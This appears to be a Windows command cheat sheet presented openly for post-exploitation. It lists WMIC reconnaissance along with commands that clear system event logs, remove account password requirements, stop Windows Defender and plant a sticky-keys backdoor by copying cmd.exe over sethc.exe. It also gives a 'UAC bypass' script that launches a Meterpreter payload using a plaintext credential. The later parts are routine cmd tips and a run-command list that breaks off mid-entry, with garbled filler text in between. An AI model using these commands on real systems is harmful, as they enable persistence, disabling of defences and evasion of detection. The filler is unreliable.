Post Exploitation Using WMIC 
Get System Roles, User Name, and Manufacturer
wmic computersystem get Name, domain, Manufacturer, Model, Username, Roles /format:list
Get the SIDs
wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status
Create a process
wmic process call create "taskmgr.exe"
Change Priority of a Process
wmic process where name="explorer.exe" call setpriority 64
Terminate a process 
wmic process where name="explorer.exe" call terminate
Get a list of Executable Files
wmic PROCESS WHERE "NOT ExecutablePath LIKE ‘%Windows%’" GET ExecutablePath
Get Folder Properties
wmic FSDIR where "drive='c:' and filename='test" get /format:list
Get File Properties
wmic datafile where name='c:\\windows\\system32\\demo\\demo.txt' get /format:list
Locate System Files
wmic environment get Description, VariableValue
Get a list of Installed Applications 
wmic product get name
Get a list of Running Services
wmic service where (state="running") get caption, name, startmode, state
Get Startup Services
wmic startup get Caption, Command
Get System Driver Details
wmic sysdriver get Caption, Name, PathName, ServiceType, State, Status /format:list
Get OS Details
wmic os get CurrentTimeZone, FreePhysicalMemory, FreeVirtualMemory, LastBootUpdate, NumberofProcesses, NumberofUsers, Organization, Registereduser, Status /format:list
Get the Motherboard Details
wmic baseboard get Manufacturer, Product, SerialNumber, Version
Get BIOS Serial Number
wmic bios, get serialNumber
Get Hard Disk Details
wmic diskdrive get Name, Manufacturer, Model, InterfaceType, MediaLoaded, MediaType /format:list
Get Hard Disk Partitions Details
wmic logicaldisk where drivetype=3 get Name, Compressed, Description, FileSystem, FreeSpace, SupportsDiskQuotas, VolumeDirty, VolumeName
Get Memory Cache Details
wmic memcache get Name, BlockSize, Purpose, MaxCacheSize, Status
Get Memory Chip Details
wmic MEMORYCHIP get PartNumber, SerialNumber
Detect If victim system is a host OS or installed via VMware
wmic onboarddevice get Desciption, DeviceType, Enabled, Status /format:list
Lock a User Account
wmic useraccount where name='demo' set disabled=false
Remove Password requirement for logging
wmic useraccount where name='demo' set PasswordRequired=false
Rename a user account
wmic useraccount where name='demo' rename hacker
Restrict user from changing a password
wmic useraccount where name='hacker' set passwordchangeable=false
Get Antivirus Details
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe
Clear System Logs
wmic nteventlog where filename='system' call cleareventlog

start>run>cmd.exe
>start cmd.exe
>start cmd.exe /t:0a
>color /?
## dir creation
```sh
$ mkdir c:\temp
$ >echo hey > cmd.exe
>del cmd.exe
>notepad file.txt
```
clear the screen
>cls
current working directory
>cd 
to find particular string in output
>sc query | find "Event"
show contents of a file
>type c:\windows\win.ini
command history
Alt+F7
how many files are in system32
dir /b c:\windows\system32 | find /c /v ""
what is the length of ini file
type c:\windows\win.ini | find /c /v ""

taskmgr.exe
explorer.exe
regedit.exe
msconfig.exe
lusrmgr.msc
control
control schedtsks
evetvwr.msc
services.msc
secpol.msc

find hidden directory
>dir /aHD
searching directory
>dir /b /s c:\ | find /i "wmic.exe"
>dir /b /s wmic.exe
>dir /b /s *wmic*
>dir /b /s c:\wmic.exe
searching file conents
>findstr /d:c:\windows/system32 "Admin" *
>findstr "Admin" *.ini
The net user command
>net user
>net user fred passwd /add
>net user fred *
account details
>net user fred
account deletion
net user fred /del
change ip address
>netsh int ip set address "Local area connection" static 192.168.10.10 255.255.255.0 192.168.10.1
show firewall settings
>netsh firewall show config

show running process
>tasklist
>tasklist /src
>tasklist /fi "imagename eq cms.exe" /m
>tasklist /m ntdll.dll
kill process
>taskkill /PID [pid]
>taskkill /PID [pid] /PID [pid2]
>taskkill /IM cmd.exe

stop services
>sc query dhcp
>sc stop dhcp


copy d:\windows\system32\sethc.exe d:\
copy /y d:\windows\system32\cmd.exe d:\windows\system32\sethc.exe



Checking your Windows version using CMD
   • systeminfo
      OR
   • Run > winver
Find log files in directory
   •  dir /s *log* 

Process
   • tasklist
   • taskkill /F /PID pid_number


Disable windows defender:
   •  sc stop WinDefend


UAC bypass:
   •  echo $username = "alice" > run.ps1
   •  echo $secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force >> run.ps1
     echo $mycreds = New-Object System.Management.Automation.PSCredential ("$username",$secpasswd) >> run.ps1
   •  echo Start-Process veil_meterpreter.bat  -Credential ($mycreds) >> run.ps1

   • powershell -ExecutionPolicy Bypass -File run.ps1 
   
   
   
   # dsdsd
fdf- - - 
- 
- 
- 

------------

ccc|   |   |
| ------------ | ------------ |
|   |   |
|   |   |

| cddfdfdf  |dfdfd   |
| ------------ | ------------ |
|   fdfdf|dfdfdf   |
|  dfdf |  fdfdf |
xcvxcvxcvx

[========]

vcxvxcv














1. Accessibility Controls – access.cpl


2. Accessibility Wizard – accwiz


3. Add Hardware Wizard – hdwwiz.cpl


4. Add/Remove Programs – appwiz.cpl


5. Administrative Tools – control admintools


6. Automatic Updates – wuaucpl.cpl


7. Bluetooth Transfer Wizard – fsquirt


8. Calculator – calc


9. Certificate Manager – certmgr.msc


10. Character Map – charmap


11. Check Disk Utility – chkdsk


12. Clipboard Viewer – clipbrd


13. Command Prompt – cmd


14. Component Services – dcomcnfg


15. Computer Management – compmgmt.msc


16. Control Panel – control


17. Date and Time Properties – timedate.cpl


18. DDE Shares – ddeshare


19. Device Manager – devmgmt.msc


20. Direct X Troubleshooter – dxdiag


21. Disk Cleanup Utility – cleanmgr


22. Disk Defragment – dfrg.msc


23. Disk Management – diskmgmt.msc


24. Disk Partition Manager – diskpart


25. Display Properties – control desktop


26. Display Properties – desk.cpl


27. Dr. Watson System Troubleshooting Utility – drwtsn32


28. Driver Verifier Utility – verifier


29. Event Viewer – eventvwr.msc


30. Files and Settings Transfer Tool – migwiz


31. File Signature Verification Tool – sigverif


32. Findfast – findfast.cpl


33. Firefox – firefox


34. Folders Properties – control folders


35. Fonts – control fonts


36. Fonts Folder – fonts


37. Free Cell Card Game – freecell


38. Game Controllers – joy.cpl


39. Group Policy Editor (for xp professional) – gpedit.msc


40. Hearts Card Game – mshearts


41. Help and Support – helpctr


42. HyperTerminal – hypertrm


43. Iexpress Wizard – iexpress


44. Indexing Service – ciadv.msc


45. Internet Connection Wizard – icwconn1


46. Internet Explorer – iexplore


47. Internet Properties – inetcpl.cpl


48. Keyboard Properties – control keyboard


49. Local Security Settings – secpol.msc


50. Local Users and Groups – lusrmgr.msc


51. Logs You Out Of Windows – logoff


52. Malicious Software Removal Tool – mrt


53. Microsoft Chat – winchat


54. Microsoft Movie Maker – moviemk


55. Microsoft Paint – mspaint


56. Microsoft Syncronization Tool – mobsync


57. Minesweeper Game – winmine


58. Mouse Properties – control mouse


59. Mouse Properties – main.cpl


60. Netmeeting – conf


61. Network Connections – control netconnections


62. Network Connections – ncpa.cpl


63. Network Setup Wizard – netsetup.cpl


64. Notepad – notepad


65. Object Packager – packager


66. ODBC Data Source Administrator – odbccp32.cpl


67. On Screen Keyboard – osk


68. Outlook Express – msimn


69. Paint – pbrush


70. Password Properties – password.cpl


 


[the_ad id="2983"]


 


71. Performance Monitor – perfmon.msc


72. Performance Monitor – perfmon


73. Phone and Modem Options – telephon.cpl


74. Phone Dialer – dialer


75. Pinball Game – pinball


76. Power Configuration – powercfg.cpl


77. Printers and Faxes – control printers


78. Printers Folder – printers


79. Regional Settings – intl.cpl


80. Registry Editor – regedit


81. Registry Editor – regedit32


82. Remote Access Phonebook – rasphone


83. Remote Desktop – mstsc


84. Removable Storage – ntmsmgr.msc


85. Removable Storage Operator Requests – ntmsoprq.msc


86. Resultant Set of Policy (for xp professional) – rsop.msc


87. Scanners and Cameras – sticpl.cpl


88. Scheduled Tasks – control schedtasks


89. Security Center – wscui.cpl


90. Services – services.msc


91. Shared Folders – fsmgmt.msc


92. Shuts Down Windows – shutdown


93. Sounds and Audio – mmsys.cpl


94. Spider Solitare Card Game – spider


95. SQL Client Configuration – cliconfg


96. System Configuration Editor – sysedit


97. System Configuration Utility – msconfig


98. System Information – msinfo32


99. System Properties – sysdm.cpl


100. Task Manager – taskmgr


101. TCP Tester – tcptest


102. Telnet Client – telnet


103. User Account Management – nusrmgr.cpl


104. Utility Manager – utilman


105. Windows Address Book – wab


106. Windows Address Book Import Utility – wabmig


107. Windows Explorer – explorer.


